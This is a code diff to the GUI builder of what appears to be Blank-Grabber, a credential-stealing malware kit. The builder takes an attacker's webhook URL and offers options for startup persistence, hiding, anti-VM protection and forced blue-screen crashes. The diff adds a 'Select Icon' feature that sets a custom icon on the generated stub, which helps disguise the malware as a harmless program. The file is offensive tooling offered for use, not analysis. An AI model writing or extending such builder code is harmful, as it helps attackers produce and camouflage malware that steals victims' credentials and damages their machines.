@@ -1,5 +1,5 @@
 import tkinter as tk
-from tkinter import ttk, messagebox
+from tkinter import ttk, messagebox, filedialog
 from urllib.request import urlopen, Request
 from socket import create_connection
 import json, os, subprocess, shutil, webbrowser, time, ctypes
@@ -15,6 +15,7 @@ def ToggleConsole(choice): # I am not using .pyw extention because of some reaso
 class Builder:
 	def __init__(self):
 		self.root = tk.Tk()
+		self.iconFileData = bytes()
 		self.PingME = tk.BooleanVar(self.root, True)
 		self.VMprotect = tk.BooleanVar(self.root, True)
 		self.BSOD = tk.BooleanVar(self.root, True)
@@ -38,7 +39,7 @@ class Builder:
 		webhookEntry.bind("<FocusOut>", lambda event: self.webhookEntryHint(event))
 		webhookEntry.bind("<FocusIn>", lambda event: self.webhookEntryHint(event))
 		webhookEntry.place(x= 20, y= 60, height= 30, width= 750)
-		testHook_button= tk.Button(self.root, text= "Test Webhook", command= lambda: self.testHook(webhookEntry.get()), background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", font= ("Franklin Gothic", 10), width= 15)
+		testHook_button= tk.Button(self.root, text= "Test Webhook", command= lambda: self.testHook(webhookEntry.get()), background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", font= ("Franklin Gothic", 10, "bold"), width= 15)
 		testHook_button.place(x = 770, anchor= "e", y= 110)
 		PingME = tk.Checkbutton(self.root, text= "Ping Me", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.PingME)
 		BSOD = tk.Checkbutton(self.root, text= "BSOD", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.BSOD)
@@ -51,6 +52,12 @@ class Builder:
 		BSOD.place(y= 200, x= 20)
 		Startup.place(y= 230, x= 20)
 		Hide.place(y= 260, x= 20)
+
+		FileNameLabel = ttk.Label(background= "black", foreground= "white", font= ("Franklin Gothic", 10, "bold"))
+		FileNameLabel.place(x= 560, y= 130, anchor= "n")
+		FileNameLabel.bind("<ButtonRelease-1>", lambda event: self.unselectIcon(event))
+		IconButton = tk.Button(text= "Select Icon", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font= ("Franklin Gothic", 10, "bold"), command= lambda: self.selectIcon(FileNameLabel))
+		IconButton.place(x= 630, y= 110, anchor= "e")
 
 		GithubButton = tk.Button(text= "Github", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font= ("Franklin Gothic", 10, "bold"), command= lambda: webbrowser.open("https://github.com/Blank-c/Blank-Grabber", new= 2))
 		GithubButton.place(x= 770, y= 180, anchor= "e")
@@ -121,6 +128,11 @@ class Builder:
 			file.write(hook)
 		os.chdir(os.path.join(os.path.dirname(__file__), "env", "Scripts"))
 		print("\u001b[0m", end= "", flush= True)
+		if os.path.isfile("icon.ico"):
+			os.rename("icon.ico", "icon.ico.old")
+		if len(self.iconFileData):
+			with open("icon.ico", "wb") as file:
+				file.write(self.iconFileData)
 		os.startfile("run.bat")
 
 	def checkInternetConnection(self):
@@ -129,6 +141,20 @@ class Builder:
 			return True
 		except OSError:
 			return False
+
+	def selectIcon(self, FileNameLabel):
+		filetypes = (
+			("Icon File", ".ico"),
+			)
+		fileloc = filedialog.askopenfilename(title= "Select stub icon", initialdir= os.path.join(os.getenv("userprofile"), "Pictures"), filetypes= filetypes)
+		if os.path.isfile(fileloc):
+			with open(fileloc, "rb") as file:
+				self.iconFileData = file.read()
+			FileNameLabel['text'] = os.path.basename(fileloc)
+
+	def unselectIcon(self, event):
+		event.widget['text'] = str()
+		self.iconFileData = bytes()
 
 	def ToggleBsod(self, BSOD):
 		if not self.VMprotect.get():
